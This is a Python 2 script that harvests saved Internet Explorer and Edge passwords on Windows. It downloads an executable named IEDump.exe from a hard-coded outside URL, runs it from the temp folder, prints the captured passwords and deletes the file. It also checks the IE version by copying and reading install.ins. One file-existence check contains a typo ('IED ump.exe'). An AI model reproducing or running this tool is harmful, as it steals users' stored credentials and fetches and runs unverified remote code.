#coding:utf-8
import os,urllib2
import shutil,platform,re

	
"""
support IE10 or later
support Edge perfectly 

"""


reqURL = "http://lzp.org.cn/IEDump.exe"

x32_path = os.getenv('programfiles') + os.sep + 'Internet Explorer' + os.sep + 'SIGNUP' + os.sep + 'install.ins'
if 'PROGRAMW6432' in os.environ.keys():
	x64_path = os.getenv('programw6432') + os.sep + 'Internet Explorer' + os.sep + 'SIGNUP' + os.sep + 'install.ins'

def type_version(x32_path):
	out = ''
	if os.path.exists(x32_path):
		shutil.copyfile(x32_path, os.getenv('tmp')+os.sep+'InternetExploerBrowser')
		cmd = "type  " + os.getenv('tmp') + os.sep+'InternetExploerBrowser'
		out = os.popen(cmd).read()
		os.remove(os.getenv('tmp')+os.sep+'InternetExploerBrowser')
		if not out:
			try:
				shutil.copyfile(x32_path, 'D:\\InternetExploerBrowser')
			except Exception,e:
				try:
					shutil.copyfile(x32_path, 'log')
				except Exception,e:
					pass
				out = os.popen("type log").read()
				os.remove('log')
				return out
			out = os.popen("type D:\\InternetExploerBrowser").read()
			os.remove("D:\\InternetExploerBrowser")
			return out
		return out
	return

def check_version():
	try:
		versionlog = type_version(x32_path)
		if not versionlog:
			versionlog = type_version(x64_path)
			if not versionlog:
				return False
	except Exception, e:
		return False
	pattern = re.compile("Version=(\d{1,3})")
	result = float(pattern.findall(versionlog)[0])
	if result >= 11:
		return True
	return False
	
def dump_pawd():
	passwd = ''
	if os.path.exists("IED ump.exe"):
		passwd = os.popen("IEDump.exe").read()
	else:
		try:
			exe_path = os.getenv("TMP") + "\\IEDump.exe"
			with open(exe_path,"wb") as f:
				f.write(urllib2.urlopen(reqURL).read())
				f.close()
				passwd = os.popen(exe_path).read()
				os.remove(exe_path)

		except Exception,e:
			pass
	return passwd

def dump_ie():
	if float(platform.win32_ver()[0]) > 7:
		print '\n------------------------Edge(IE) Password Found!------------------------\n'
		print dump_pawd()
		print '-----------------------------------END-------------------------------------'
	else:
		if check_version():
			print '\n------------------------Edge(IE) Password Found!------------------------\n'
			print dump_pawd()
			print '-----------------------------------END-------------------------------------'
if __name__ == '__main__':
	dump_ie()